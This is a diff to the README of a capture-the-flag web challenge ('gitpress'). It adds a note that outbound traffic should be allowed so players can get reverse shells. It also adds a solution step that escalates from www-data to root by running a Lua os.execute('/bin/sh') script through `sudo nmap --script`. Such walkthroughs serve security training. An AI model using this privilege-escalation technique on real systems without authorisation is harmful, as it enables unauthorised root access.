@@ -28,7 +28,7 @@ It is a multi-level challenge that requires the player to do the following:
 
 *Test locally:* Simply run `./start.sh` to build and run the Docker container. The website will be accessible at (http://localhost:8080)[http://localhost:8080]. When you're done, tear it down with `docker stop gitpress`.
 
-*Run in AWS:* I don't know how to set this up - just make sure ports 80 and 3306 are publicly accessible.
+*Run in AWS:* I don't know how to set this up - just make sure ports 80 and 3306 are publicly accessible. Outbound traffic should be allowed so that the player can get a reverse shell.
 
 ### Solve the challenge
 
@@ -51,5 +51,12 @@ It is a multi-level challenge that requires the player to do the following:
    - PHP file upload + binary execution
 11. Perform local reconnaissance and identify that the current user is `www-data` with home directory `/var/www`.
    - Collect Flag 3 at `/var/www/flag3.txt`.
-12. Privesc TBD
+12. Check sudo privileges with `sudo -l` and find that `www-data` can execute `sudo nmap`.
+   - Maybe try `sudo nmap --interactive` but the version doesn't support it.
+   - Open a root shell like so:
+     ```
+     TF=$(mktemp)
+     echo 'os.execute("/bin/sh")' > $TF
+     sudo nmap --script=$TF
+     ```
    - Collect Flag 4 at `/root/flag4.txt`.
